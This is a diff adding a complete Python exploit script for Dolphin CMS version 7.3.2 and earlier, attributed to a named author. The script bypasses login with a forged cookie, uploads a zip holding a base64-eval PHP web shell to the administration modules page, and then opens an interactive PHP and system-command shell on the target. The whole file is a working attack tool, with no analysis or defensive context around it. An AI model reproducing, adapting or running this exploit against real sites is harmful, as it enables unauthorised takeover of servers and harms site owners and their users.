@@ -1,0 +1,91 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+'''
+Software : Dolphin <= 7.3.2 Auth bypass / RCE exploit
+Vendor : www.boonex.com
+Author : Ahmed sultan (0x4148)
+Home : 0x4148.com | https://www.linkedin.com/in/0x4148
+Email : 0x4148@gmail.com
+Auth bypass trick credit go to Saadat Ullah
+'''
+import os
+import sys
+import urllib
+import urllib2
+import ssl
+import base64
+print "[+] Dolphin <= 7.3.2 Auth bypass / RCE exploit"
+print "[+] Author : Ahmed sultan (0x4148)"
+print "[+] Home : 0x4148.com\n"
+if len(sys.argv)<2:
+	print "\nUsage : python "+sys.argv[0]+" http://HOST/path/\n"
+	sys.exit();
+hosturl=sys.argv[1]
+fields = {'csrf_token': 'Aint give a shit about csrf stuff ;)', 'submit_upload': '0x4148'}
+gcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
+def generate_http_request(fields):
+	lmt = '---------------------------'
+	crlf = '\r\n'
+	x4148mltprt = []
+	x4148mltprt.append('--' + lmt)
+	if fields:
+		for (key, value) in fields.items():
+			x4148mltprt.append('Content-Disposition: form-data; name="%s"' % key)
+			x4148mltprt.append('')
+			x4148mltprt.append(value)
+			x4148mltprt.append('--' + lmt)
+	x4148mltprt.append('Content-Disposition: form-data; name="module"; filename="0x4148.zip"')
+	x4148mltprt.append('Content-Type: application/zip')
+	x4148mltprt.append('')
+	x4148mltprt.append("PK\x03\x04\x0a\x00\x00\x00\x00\x00RanIj\xf0\xfdU1\x00\x00\x001\x00\x00\x00\x0c\x00\x00\x000x4148fo.php"
+	"<?php\x0d\x0aeval(base64_decode($_POST[\'0x4148\']));\x0d\x0a?>PK\x01\x02\x14\x00\x0a\x00\x00\x00\x00\x00RanIj"
+	"\xf0\xfdU1\x00\x00\x001\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x01\x00 \x00\x00\x00\x00\x00\x00\x000x4148fo.php"
+	"PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00:\x00\x00\x00[\x00\x00\x00\x00\x00")
+	x4148mltprt.append('--' + lmt + '--')
+	x4148mltprt.append('')
+	body = crlf.join(x4148mltprt)
+	content_type = 'multipart/form-data; boundary=%s' % (lmt)
+	return content_type, body
+content_type, body = generate_http_request(fields)
+print " + Sending payload to "+hosturl.split("//")[1].split("/")[0]
+req = urllib2.Request(hosturl+"/administration/modules.php",body)
+req.add_header('User-agent', 'Mozilla 15')
+
+req.add_header("Cookie", "memberID=1; memberPassword[]=0x4148;")
+req.add_header('Referer', hosturl+"/administration/modules.php")
+req.add_header('Content-Type', content_type)
+req.add_header('Content-Length', str(len(body)))
+req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
+try:
+	urllib2.urlopen(req,context=gcontext).read()
+except urllib2.HTTPError, e:
+	err=e.fp.read()
+	print err
+	sys.exit()
+print " * Checking if payload was send"
+data = urllib.urlencode({'0x4148':'echo "0x4148foooo";'.encode('base64')})
+req = urllib2.Request(hosturl+'/tmp/0x4148fo.php', data)
+if urllib2.urlopen(req).read().find("0x4148foooo")==-1:
+	print " - Exploitation failed"
+	print req
+	sys.exit()
+print " + php prompt up and running\n + type 'shell' to get shell access"
+while True:
+	request=str(raw_input("\nphp>> "))
+	if request=="exit":
+		sys.exit()
+	if request=="shell" or request=="cmd":
+		print "\n + Switched to Shell mode\n + Type 'return' to return to php prompt mode"
+		while True:
+			cmd=str(raw_input("\n0x4148@"+hosturl.split("//")[1].split("/")[0]+"# "))
+			if cmd=="return":
+				break
+			if cmd=="exit":
+				sys.exit()
+			kkk="passthru('"+cmd+"');"
+			data = urllib.urlencode({'0x4148':kkk.encode('base64')})
+			req = urllib2.Request(hosturl+'/tmp/0x4148fo.php', data)
+			print urllib2.urlopen(req).read()
+	data = urllib.urlencode({'0x4148':request.encode('base64')})
+	req = urllib2.Request(hosturl+'/tmp/0x4148fo.php', data)
+	print urllib2.urlopen(req).read()
